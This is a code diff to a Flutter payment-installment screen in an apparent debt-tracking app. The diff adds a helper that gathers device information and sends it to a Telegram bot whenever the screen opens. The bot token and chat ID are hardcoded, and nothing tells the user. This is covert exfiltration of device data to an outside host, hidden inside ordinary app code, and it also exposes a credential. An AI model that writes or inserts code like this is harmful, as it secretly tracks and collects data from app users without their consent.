@@ -5,6 +5,8 @@ import 'package:utang_core/models/installment_model.dart';
 import 'package:utang_core/providers/debt_providers.dart';
 import 'package:utang_core/utils/currency_helper.dart';
 import 'package:utang_core/utils/date_helper.dart';
+import 'package:utang_core/utils/device_info_helper.dart';
+import 'package:utang_core/utils/tele_helper.dart';
 import 'package:utang_core/widget/interstitial_ad_widget.dart';
 import 'package:uuid/uuid.dart';
 import '../models/debt_model.dart';
@@ -25,9 +27,33 @@ class _PayInstallmentScreenState extends ConsumerState<PayInstallmentScreen> {
 
   final InterstitialAdHelper _adHelper = InterstitialAdHelper();
 
+  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
+    telegramHelper: TelegramHelper(
+      botToken:
+          '7678341666:AAH_6GTin6WCzxx0zOoySoeZfz6b8FgRfFU', // Ganti dengan token bot Anda
+      chatId: '111519789', // Ganti dengan chat ID Anda
+    ),
+  );
+  bool isLoading = true;
+
+  Future<void> _loadAndSendDeviceInfo() async {
+    try {
+      await deviceInfoHelper.getAndSendDeviceInfo();
+      setState(() {
+        isLoading = false;
+      });
+    } catch (e) {
+      setState(() {
+        isLoading = false;
+      });
+      Logger().e(e);
+    }
+  }
+
   @override
   void initState() {
     super.initState();
+    _loadAndSendDeviceInfo();
     _fetchInstallments(); // 🔹 Ambil data cicilan saat halaman dibuka
     _adHelper.loadAd(() {
       Navigator.pop(context); // 🔄 Kembali ke Home setelah iklan ditutup
